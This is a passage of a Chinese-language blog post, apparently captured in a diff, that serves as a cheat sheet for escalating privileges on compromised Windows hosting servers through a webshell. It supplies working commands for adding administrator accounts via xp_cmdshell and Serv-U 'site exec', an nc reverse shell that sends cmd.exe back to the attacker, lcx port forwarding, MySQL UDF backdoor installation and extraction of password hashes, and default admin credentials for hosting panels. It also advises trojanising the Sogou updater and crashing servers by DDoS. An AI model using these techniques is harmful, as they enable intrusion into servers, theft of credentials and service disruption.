class="emphasis">_LOCAL_</span>MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</span><br></pre></td></tr></table></figure>
+
+<h1 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="headerlink" title="**wscript.shell的删除和恢复 **"></a>**wscript.shell的删除和恢复 **</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%system32WSHom.Ocx</span><br><span class="line"></span><br><span class="line">卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%system32scrrun.dll</span><br><span class="line"></span><br><span class="line">卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:ProgramFilesCommonFilesSystemadomsado15.dll”</span><br><span class="line"></span><br><span class="line">如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了</span><br></pre></td></tr></table></figure>
+
+<h1 id="如何找到准确的终端连接端口？"><a href="#如何找到准确的终端连接端口？" class="headerlink" title="如何找到准确的终端连接端口？"></a>如何找到准确的终端连接端口？</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在aspx大马里，点击“系统信息”第三个就是目前的3389端口</span><br><span class="line"></span><br><span class="line">或是执行命令查看正在运行的服务：tasklist /svc</span><br><span class="line"></span><br><span class="line">找到：svchost.exe 1688 TermService</span><br><span class="line"></span><br><span class="line">记住1688这个ID值，</span><br><span class="line"></span><br><span class="line">查看开放的所有端口：netstat -ano</span><br><span class="line"></span><br><span class="line">找到1688这个ID值所对应的端口就是3389目前的端口</span><br></pre></td></tr></table></figure>
+
+<h1 id="iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法" class="headerlink" title="**iis6提权提示Can not find wmiprvse.exe的突破方法 **"></a>**iis6提权提示Can not find wmiprvse.exe的突破方法 **</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">windows2003    iis6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iis7在windows2008以上</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">突破方法一：</span><br><span class="line"></span><br><span class="line">在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</span><br><span class="line"></span><br><span class="line">在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">突破方法二：</span><br><span class="line"></span><br><span class="line">虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</span><br><span class="line"></span><br><span class="line">甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="本地溢出提权"><a href="#本地溢出提权" class="headerlink" title="**本地溢出提权 **"></a>**本地溢出提权 **</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</span><br><span class="line"></span><br><span class="line">缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</span><br><span class="line"></span><br><span class="line">利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</span><br><span class="line"></span><br><span class="line">想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</span><br></pre></td></tr></table></figure>
+
+<h1 id="sa提权-windows。。sqlserver只能用于windows"><a href="#sa提权-windows。。sqlserver只能用于windows" class="headerlink" title="sa提权 -windows。。sqlserver只能用于windows"></a><strong>sa提权 -windows。。sqlserver只能用于windows</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件</span><br><span class="line"></span><br><span class="line">也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</span><br><span class="line"></span><br><span class="line">aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即可</span><br><span class="line"></span><br><span class="line">增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;–</span><br><span class="line">提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei /add’;–</span><br><span class="line"></span><br><span class="line">PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</span><br></pre></td></tr></table></figure>
+
+<h1 id="root提权-–windows-linux"><a href="#root提权-–windows-linux" class="headerlink" title="root提权 –windows&#x2F;linux"></a><strong>root提权 –windows&#x2F;linux</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码</span><br><span class="line"></span><br><span class="line">如何判断一台windows服务器上的mysql有没有降权？</span><br><span class="line">cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</span><br><span class="line"></span><br><span class="line">如何判断服务器上是否开启了mysql服务？</span><br><span class="line">开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</span><br><span class="line"></span><br><span class="line">如何查看root密码？</span><br><span class="line">在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。</span><br><span class="line">有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。</span><br><span class="line"></span><br><span class="line">可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</span><br><span class="line"></span><br><span class="line">填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</span><br><span class="line"></span><br><span class="line">注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中</span><br><span class="line"></span><br><span class="line">例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll</span><br><span class="line"></span><br><span class="line">如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，</span><br><span class="line">1、停止mysql服务</span><br><span class="line">2、替换下载下来的3个文件（user.MYI user.MYD user.frm）</span><br><span class="line">3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables</span><br><span class="line">4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot</span><br><span class="line">5、最后查询一下就出来了select user,password from mysql.user;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="serv-u提权-–ftp–windows"><a href="#serv-u提权-–ftp–windows" class="headerlink" title="serv-u提权 –ftp–windows"></a><strong>serv-u提权 –ftp–windows</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\ServUDaemon.ini</span><br><span class="line"></span><br><span class="line">找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2</span><br><span class="line"></span><br><span class="line">再拿md5密文去解密，再用现在的密码登陆提权即可。</span><br><span class="line"></span><br><span class="line">serv-u提权的前提是43958端口开了，且知道帐号密码！</span><br><span class="line"></span><br><span class="line">如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</span><br><span class="line"></span><br><span class="line">530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..</span><br><span class="line"></span><br><span class="line">在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</span><br><span class="line"></span><br><span class="line">目录有修改权限之serv-u提权：</span><br><span class="line"></span><br><span class="line">找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！</span><br><span class="line"></span><br><span class="line">接着本地cmd命令：ftp 服务器ip</span><br><span class="line"></span><br><span class="line">回车，输入帐号密码再回车………………….</span><br><span class="line"></span><br><span class="line">接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：</span><br><span class="line"></span><br><span class="line">Quote site exec net user jianmei daxia /add 增加一个用户</span><br><span class="line"></span><br><span class="line">Quote site exec net localgroup administrators jianmei /add 提升到管理员权限</span><br><span class="line"></span><br><span class="line">200 EXEC command successful (TID=33). 执行成功的回显信息</span><br><span class="line"></span><br><span class="line">Maintenance=System 权限类型多加一行指定新加帐号为系统管理员</span><br><span class="line"></span><br><span class="line">ReloadSettings=True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="**端口转发 **"></a>**端口转发 **</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">什么情况下适合转发端口？</span><br><span class="line"></span><br><span class="line">1.服务器是内网，我们无法连接。</span><br><span class="line">2.服务器上有防火墙，阻断我们的连接。</span><br><span class="line"></span><br><span class="line">转发端口的前提，我们是外网或是有外网服务器。</span><br><span class="line"></span><br><span class="line">找个可读可写目录上传lcx.exe</span><br><span class="line"></span><br><span class="line">本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）</span><br><span class="line"></span><br><span class="line">接着shell命令：/c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）</span><br><span class="line"></span><br><span class="line">之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</span><br><span class="line"></span><br><span class="line">以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</span><br><span class="line"></span><br><span class="line">上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</span><br><span class="line"></span><br><span class="line">接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</span><br></pre></td></tr></table></figure>
+
+<h1 id="nc反弹提权"><a href="#nc反弹提权" class="headerlink" title="**nc反弹提权 **"></a>**nc反弹提权 **</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</span><br><span class="line"></span><br><span class="line">不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</span><br><span class="line"></span><br><span class="line">找个可读可写目录上传nc.exe cmd.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l 监听本地入栈信息</span><br><span class="line"></span><br><span class="line">-p port打开本地端口</span><br><span class="line"></span><br><span class="line">-t 以telnet形式应答入栈请求</span><br><span class="line"></span><br><span class="line">-e 程序重定向</span><br><span class="line"></span><br><span class="line">本地cmd执行：nc -vv -l -p 52 进行反弹</span><br><span class="line"></span><br><span class="line">接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多</span><br><span class="line"></span><br><span class="line">执行成功后本地cmd命令：cd/ （只是习惯而已）</span><br><span class="line"></span><br><span class="line">接着以telnet命令连接服务器：telnet 服务器ip 999</span><br><span class="line"></span><br><span class="line">回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</span><br><span class="line"></span><br><span class="line">坏蛋：</span><br><span class="line">本地cmd执行：nc -vv -l -p 52 进行反弹</span><br><span class="line">c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52</span><br><span class="line"></span><br><span class="line">低调小飞：</span><br><span class="line">shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe</span><br><span class="line"></span><br><span class="line">这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。</span><br></pre></td></tr></table></figure>
+
+<h1 id="星外提权-–windows"><a href="#星外提权-–windows" class="headerlink" title="星外提权 –windows"></a><strong>星外提权 –windows</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">如何知道是不是星外主机？</span><br><span class="line"></span><br><span class="line">第一：网站物理路径存在“freehost”</span><br><span class="line">第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</span><br><span class="line"></span><br><span class="line">默认帐号：freehostrunat</span><br><span class="line">默认密码：fa41328538d7be36e83ae91a78a1b16f!7</span><br><span class="line"></span><br><span class="line">freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</span><br><span class="line"></span><br><span class="line">星外常写目录：</span><br><span class="line"></span><br><span class="line">C:RECYCLER</span><br><span class="line">C:windowstemp</span><br><span class="line">e:recycler</span><br><span class="line">f:recycler</span><br><span class="line">C:phpPEAR</span><br><span class="line">C:WINDOWS7i24.comFreeHost</span><br><span class="line">C:phpdev</span><br><span class="line">C:System Volume Information </span><br><span class="line">C:7i24.comserverdoctorlog</span><br><span class="line">C:WINDOWSTemp</span><br><span class="line">c:windowshchiblis.ibl </span><br><span class="line">C:7i24.comiissafelog </span><br><span class="line">C:7i24.comLinkGatelog </span><br><span class="line">C:Program FilesThunder NetworkThunder7</span><br><span class="line">C:Program FilesThunder NetworkThunder</span><br><span class="line">C:Program FilesSymantec AntiVirusSAVRT</span><br><span class="line">c:windowsDriverPacksCAM2</span><br><span class="line">C:Program FilesFlashFXP</span><br><span class="line">c:Program FilesMicrosoft SQL Server90SharedErrorDumps</span><br><span class="line">C:Program FilesZendZendOptimizer-3.3.0 </span><br><span class="line">C:Program FilesCommon Files</span><br><span class="line">c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv</span><br><span class="line">c:Program Files360360SafedeepscanSectionmutex.db</span><br><span class="line">c:Program FilesHeliconISAPI_Rewrite3error.log</span><br><span class="line">c:Program FilesHeliconISAPI_Rewrite3Rewrite.log </span><br><span class="line">c:Program FilesHeliconISAPI_Rewrite3httpd.conf </span><br><span class="line">c:Program FilesCommon FilesSymantec SharedPersist.bak </span><br><span class="line">c:Program FilesCommon FilesSymantec SharedValidate.dat </span><br><span class="line">c:Program FilesCommon FilesSymantec SharedValidate.dat </span><br><span class="line">C:Program FilesZendZendOptimizer-3.3.0docs</span><br><span class="line">C:Documents and SettingsAll UsersDRM</span><br><span class="line">C:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtection</span><br><span class="line">C:Documents and SettingsAll UsersApplication Data360safesoftmgr</span><br><span class="line">C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll </span><br><span class="line">C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ee提权法：</span><br><span class="line"></span><br><span class="line">找个可读可写目录上传ee.exe</span><br><span class="line"></span><br><span class="line">cmd命令：/c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）</span><br><span class="line"></span><br><span class="line">接着命令：/c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vbs提权法：</span><br><span class="line"></span><br><span class="line">找个可读可写目录上传cscript.exe iispwd.vbs</span><br><span class="line"></span><br><span class="line">cmd命令：/c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs</span><br><span class="line"></span><br><span class="line">意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可行思路大全：</span><br><span class="line"></span><br><span class="line">经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：</span><br><span class="line"></span><br><span class="line">360杀毒db文件替换:</span><br><span class="line">c:Program Files360360SDdeepscanSectionmutex.db </span><br><span class="line">c:Program Files360360SafedeepscanSectionmutex.db </span><br><span class="line">C:Program Files360360SafeAntiSectionmutex.db</span><br><span class="line"></span><br><span class="line">IISrewrite3 文件替换：</span><br><span class="line">C:Program FilesHeliconISAPI_Rewrite3Rewrite.log</span><br><span class="line">C:Program FilesHeliconISAPI_Rewrite3httpd.conf</span><br><span class="line">C:Program FilesHeliconISAPI_Rewrite3error.log</span><br><span class="line"></span><br><span class="line">诺顿杀毒文件替换:</span><br><span class="line">c:Program FilesCommon FilesSymantec SharedPersist.bak </span><br><span class="line">c:Program FilesCommon FilesSymantec SharedValidate.dat </span><br><span class="line">c:Program FilesCommon FilesSymantec SharedPersist.Dat</span><br><span class="line"></span><br><span class="line">一流过滤相关目录及文件： </span><br><span class="line">C:7i24.comiissafelogstartandiischeck.txt </span><br><span class="line">C:7i24.comiissafelogscanlog.htm</span><br><span class="line"></span><br><span class="line">其他:</span><br><span class="line">Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll</span><br><span class="line">华盾文件替换：C:WINDOWShchiblis.ibl</span><br><span class="line">Flash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocx</span><br><span class="line">DU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv</span><br></pre></td></tr></table></figure>
+
+<h1 id="360提权-–windows"><a href="#360提权-–windows" class="headerlink" title="360提权 –windows"></a><strong>360提权 –windows</strong></h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">找个可读可写目录上传360.exe</span><br><span class="line"></span><br><span class="line">cmd命令：/c c:windowstempcookies360.exe</span><br><span class="line"></span><br><span class="line">会提示3段英文：</span><br><span class="line"></span><br><span class="line">360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2</span><br><span class="line"></span><br><span class="line">You will get a Shift5 door!</span><br><span class="line"></span><br><span class="line">Shift5 Backdoor created! </span><br><span class="line"></span><br><span class="line">这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="搜狗提权-–windows"><a href="#搜狗提权-–windows" class="headerlink" title="搜狗提权 –windows"></a><strong>搜狗提权 –windows</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe</span><br><span class="line"></span><br><span class="line">我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</span><br></pre></td></tr></table></figure>
+
+<h1 id="华众虚拟主机提权-–windows"><a href="#华众虚拟主机提权-–windows" class="headerlink" title="华众虚拟主机提权 –windows"></a><strong>华众虚拟主机提权 –windows</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。</span><br><span class="line"></span><br><span class="line">所以华众提权关键之处就是搜集信息，主要注册表位置：</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG</span><br><span class="line">HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码</span><br><span class="line">HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码</span><br><span class="line"></span><br><span class="line">c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码</span><br><span class="line"></span><br><span class="line">以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</span><br><span class="line"></span><br><span class="line">百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</span><br></pre></td></tr></table></figure>
+
+<h1 id="N点虚拟主机-–windows"><a href="#N点虚拟主机-–windows" class="headerlink" title="N点虚拟主机 –windows"></a><strong>N点虚拟主机 –windows</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdb</span><br><span class="line"></span><br><span class="line">rl直接输入不行 这里咱们替换下 #=# 空格=</span><br><span class="line"></span><br><span class="line">修改后的下载地址为/host_date/#host # date#196.mdb</span><br><span class="line"></span><br><span class="line">N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码</span><br><span class="line"></span><br><span class="line">N点默认安装路径C:Program FilesNpointSoftnpointhostweb</span><br><span class="line">D:Program FilesNpointSoftnpointhostweb</span><br><span class="line">默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</span><br><span class="line"></span><br><span class="line">N点解密工具代码</span><br></pre></td></tr></table></figure>
+
